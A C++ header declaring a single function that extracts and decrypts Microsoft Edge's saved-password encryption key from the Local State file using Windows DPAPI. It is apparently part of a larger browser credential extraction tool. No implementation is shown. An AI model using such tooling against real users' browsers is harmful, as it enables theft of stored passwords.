// EdgeDPAPI.h - DPAPI operations for Edge password key extraction
#ifndef EDGE_DPAPI_H
#define EDGE_DPAPI_H

#include <Windows.h>
#include <vector>
#include <filesystem>
#include "CommunicationLayer.h"

namespace fs = std::filesystem;

// Extracts and decrypts Edge password encryption key using Windows DPAPI
// This function runs in the orchestrator's context, avoiding the need for
// COM elevation specifically for Edge password decryption
std::vector<uint8_t> DecryptEdgePasswordKeyWithDPAPI(const fs::path& localStatePath, const Console& console);

#endif // EDGE_DPAPI_H